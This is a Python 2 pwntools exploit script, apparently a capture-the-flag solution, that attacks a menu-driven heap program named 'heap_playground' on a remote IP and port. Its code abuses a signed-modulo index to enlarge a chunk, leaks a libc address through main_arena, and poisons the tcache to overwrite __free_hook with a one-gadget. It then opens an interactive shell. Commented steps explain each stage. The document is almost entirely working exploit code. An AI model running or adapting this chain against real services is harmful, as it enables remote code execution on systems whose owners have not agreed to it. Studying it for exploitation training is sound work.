#!/usr/bin/env python2
from pwn import *

path = "./heap_playground"

context.binary = path

magic_number =  -0x80000000
max_len = 1024
magic_dictionary = {}

glob_id = 0

for i in range(1,max_len+1):
	magic_dictionary[-magic_number % i] = magic_dictionary.get(-magic_number % i,[]) + [i]
	magic_dictionary[-magic_number % i].sort()

#p = process(path)

p = remote("3.93.128.89",1215)

def create_chunk(size, content=False):
	global glob_id
	p.sendline("1")
	p.sendline("{}".format(size))
	if content == False:
		content =  size*chr(glob_id+1)
	p.sendline("{}".format(content))
	glob_id += 1
	return glob_id

def edit_chunk(chunk_id, index, char):
	if char == '\x00': # skip null bytes
		return
	p.sendline("4")
	p.sendline("{}".format(chunk_id))
	p.sendline("{}".format(index))
	p.sendline("{}".format(char))

def delete_chunk(chunk_id):
	p.sendline("2")
	p.sendline("{}".format(chunk_id))

def print_chunk(chunk_id):
	p.sendline("3")
	p.sendline("{}".format(chunk_id))


### LEAKING LIBC ADDRESS ###
"""
Step 1:

Goal extend a chunk size to be able to write out of bounds.

i.e. write to one of the not least significant bytes of  size

chunk struct layout:
	 lsb       msb
id:   01 00 00 00
size: 04 00 00 00
next: 00 00 00 00 00 00 00 00  (64 bit pointer)
data: ...

possible offsets 11 to 9 from data backwards
"""

# here's where the magic happens
offset = 11
magic_size = magic_dictionary[offset][0]
magic_chunk = create_chunk(magic_size)
log.info("magic chunk size: {}, offset: {}".format(magic_size,offset))
edit_chunk(magic_chunk,magic_number,"\xff")
log.success("Resized chunk from {} to {} bytes".format(magic_size, magic_size + 0xff00))

"""
Step 2:

Goal get a useful address on the heap

1. allocate  a big chunk 
2. free it
3. main_arena pointer (libc .data) is now on the heap

"""
log.info("Allocating and freeing big chunk to force a main_arena address onto the heap")
big_chunk = create_chunk(max_len) # big chunk to force main_arena pointer on leak
t1 = create_chunk(128) #  border, also used for tcache poisoning later
delete_chunk(big_chunk)

"""
Step 3:

Goal leak the address put on the heap in step two

1. Extend the string in the magic chunk data to the address
2. print the magic_chunk to leak the address
3. Calculate libc base address from leak

"""

log.info("Extending data string of chunk to connect to the main_arena adress")
for i in range(magic_size-1, magic_size+19):
	edit_chunk(magic_chunk,i,"A")

log.info("Printing chunk to leak address")
print_chunk(magic_chunk)

libc_leak = u64(p.recvline_contains(16*'A')[-6:] + "\x00\x00")
log.success("Leaked main_arena address: {}".format(hex(libc_leak)))
libc = libc_leak - 0x3ebca0
log.info("Calculate libc base address: {}".format(hex(libc)))

### POPPING A SHELL ###

"""
Step 1: 

Goal: Poison tcache to target address

1. Free t1 chunk
2. overwrite fd pointer of t1 chunk using our magic chunk
3. malloc chunk
4. Poisoned!

"""

offset = 0x440 # offset from magic_chunk data to fd pointer of t1
free_hook =  0x3ed8e8 + libc
log.info("Address of free_hook: {}".format(hex(free_hook)))
magic_gadget = 0x4f322 + libc
log.info("Address of magic_gadget: {}".format(hex(magic_gadget)))

target = p64(free_hook - 0x48)
hook_offset = 0x38 # offset from poison chunk data to hook. (to not overwrite close bytes)

log.info("Poisoning tcache to: {}".format(hex(u64(target))))

delete_chunk(t1) 

for n,i in enumerate(range(offset, offset + len(target))):
	edit_chunk(magic_chunk,i,target[n])

t2 = create_chunk(128)
poison_chunk = create_chunk(128, "")

log.success("tcache poisoned!")

target = p64(magic_gadget)

log.info("Overwriting free_hook with magic_gadget")

for n,i in enumerate(range(hook_offset, hook_offset + len(target))):
	edit_chunk(poison_chunk,i,target[n])

log.info("Triggering hook")
delete_chunk(t2) # trigger hook

log.success("pwned")
p.clean()

p.interactive()